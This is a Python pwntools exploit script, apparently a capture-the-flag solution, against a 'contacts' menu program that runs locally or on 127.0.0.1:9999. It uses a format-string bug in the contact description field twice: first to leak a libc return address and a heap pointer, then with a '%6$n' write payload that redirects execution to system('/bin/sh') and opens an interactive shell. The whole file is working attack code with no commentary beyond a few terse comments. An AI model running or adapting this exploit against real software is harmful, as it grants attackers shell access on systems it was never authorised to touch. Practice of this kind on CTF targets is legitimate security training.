from pwn import *
from LibcSearcher import *
#context.log_level = 'debug'

if args['REMOTE']:
    sh = remote('127.0.0.1', 9999)
else:
    sh = process('./contacts')

sh.recvuntil('>>> ')
sh.sendline('1')
sh.recvuntil('Name: ')
sh.sendline('a')
sh.recvuntil('Enter Phone No: ')
sh.sendline('999')
sh.recvuntil('Length of description: ')
sh.sendline('100')
sh.recvuntil('Enter description:\n\t\t')
sh.sendline('%31$pEND%11$pEND')

sh.recvuntil('>>> ')
sh.sendline('4')
sh.recvuntil('Description: ')

libc_start_main_ret = int(sh.recvuntil('END', drop=True), 16)
print "libc_start_main_ret=" + hex(libc_start_main_ret)
libc = LibcSearcher('__libc_start_main_ret', libc_start_main_ret)
libc_base = libc_start_main_ret - libc.dump('__libc_start_main_ret')
system_addr = libc_base + libc.dump('system')
binsh_addr = libc_base + libc.dump('str_bin_sh')
print 'system_addr= ' + hex(system_addr)
print 'binsh_addr= ' + hex(binsh_addr)

heap_addr = int(sh.recvuntil('END', drop=True), 16)
print "heap_addr=" + hex(heap_addr)

sh.recvuntil('>>> ')
sh.sendline('3')
sh.recvuntil('Name to change? ')
sh.sendline('a')
sh.recvuntil('>>> ')
sh.sendline('2')
sh.recvuntil('Length of description: ')
sh.sendline('100')
sh.recvuntil('Description: \n\t')
# system_addr ret_addr(aaaa) binsh_addr %{heap_addr}c %6$n
payload = p32(system_addr) + 'aaaa' + p32(binsh_addr)
# -4 means fake ebp
to_add = heap_addr - 4 - len(payload)
payload += "%{}c".format(to_add)
payload += '%6$n'
sh.sendline(payload)

#gdb.attach(sh)
sh.recvuntil('>>> ')
sh.sendline('4')
sh.recvuntil('>>> ')
sh.sendline('5')

sh.interactive()